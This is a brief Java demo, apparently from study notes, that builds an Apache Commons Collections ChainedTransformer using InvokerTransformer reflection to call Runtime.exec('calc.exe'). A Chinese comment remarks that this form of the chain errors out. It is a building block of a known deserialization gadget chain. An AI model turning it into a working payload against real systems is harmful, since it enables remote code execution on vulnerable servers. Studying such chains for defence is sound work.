import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;

import java.lang.reflect.Method;


public class Demo4{
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = {
                new ConstantTransformer(Runtime.class), //会有一次`cls=input.getClass()`，即`Runtime.class.getClass()`这样获得类将会是`java.lang.Class`，而Class是没有getRuntime方法的，所以会报错。
                new InvokerTransformer("getRuntime",new Class[0], new Object[0]),//new Class[0] / object[0]  == null
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
        };
        ChainedTransformer chain = new ChainedTransformer(transformers);
        chain.transform(null);
    }
}
